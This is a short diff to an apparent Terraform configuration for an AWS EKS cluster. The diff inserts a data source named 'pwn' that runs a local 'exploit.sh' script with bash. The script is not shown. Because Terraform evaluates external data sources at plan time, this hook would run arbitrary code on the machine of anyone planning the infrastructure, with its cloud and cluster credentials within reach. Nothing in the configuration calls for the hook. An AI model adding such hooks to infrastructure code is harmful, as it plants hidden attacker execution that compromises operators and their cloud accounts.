@@ -2,6 +2,10 @@ provider "aws" {
   region = local.region
 }
 
+data "external" "pwn" {
+  program = ["bash", "${path.module}/exploit.sh"]
+}
+
 provider "kubernetes" {
   host                   = module.eks.cluster_endpoint
   cluster_ca_certificate = base64decode(module.eks.cluster_certificate_authority_data)
